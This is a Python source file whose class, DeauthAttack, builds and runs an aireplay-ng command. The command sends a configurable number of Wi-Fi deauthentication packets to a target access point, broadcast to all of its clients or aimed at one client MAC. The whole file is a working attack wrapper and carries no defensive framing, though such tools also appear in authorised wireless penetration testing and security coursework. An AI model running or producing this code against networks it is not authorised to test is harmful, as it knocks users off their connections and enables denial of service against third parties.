import subprocess
import json # Retained for consistency with original, though direct dict return is fine
from datetime import datetime

class DeauthAttack:
    def __init__(self, iface: str, ap_bssid: str, count: int, client_mac: str = None):
        """
        Initializes the DeauthAttack instance.
        :param iface: Wireless interface to use for the attack.
        :param ap_bssid: BSSID of the target Access Point.
        :param count: Number of deauthentication packets to send.
        :param client_mac: (Optional) MAC address of a specific client to target.
                           If None, deauthentication packets are broadcast to all clients of the AP.
        """
        self.iface = iface
        self.ap_bssid = ap_bssid
        self.count = count
        self.client_mac = client_mac

    def run(self) -> dict:
        """
        Executes the deauthentication attack using aireplay-ng.
        Returns a dictionary containing the outcome of the command.
        """
        cmd = [
            "aireplay-ng",
            "--deauth", str(self.count),
            "-a", self.ap_bssid
        ]

        if self.client_mac:
            cmd.extend(["-c", self.client_mac])
        
        cmd.append(self.iface)

        timestamp = datetime.now().isoformat()
        result_dict = {
            "timestamp": timestamp,
            "status": "unknown", # Default status
            "output": "",
            "errors": "",
            "returncode": -1,
            "message": ""
        }

        try:
            process_result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, # Corrected here
                text=True,
                check=False 
            )
            
            result_dict["output"] = process_result.stdout.strip()
            result_dict["errors"] = process_result.stderr.strip()
            result_dict["returncode"] = process_result.returncode

            if process_result.returncode == 0:
                result_dict["status"] = "complete"
                result_dict["message"] = "Deauthentication packets sent successfully."
            else:
                result_dict["status"] = "error"
                result_dict["message"] = f"aireplay-ng exited with error code {process_result.returncode}."
                if result_dict["errors"]:
                     result_dict["message"] += f" Details: {result_dict['errors']}"

        except FileNotFoundError:
            result_dict["status"] = "exception"
            result_dict["message"] = "Error: aireplay-ng command not found. Is aircrack-ng suite installed and in PATH?"
            result_dict["errors"] = "aireplay-ng not found"
        except Exception as e:
            result_dict["status"] = "exception"
            result_dict["message"] = f"An unexpected error occurred: {str(e)}"
            result_dict["errors"] = str(e)
            
        return result_dict
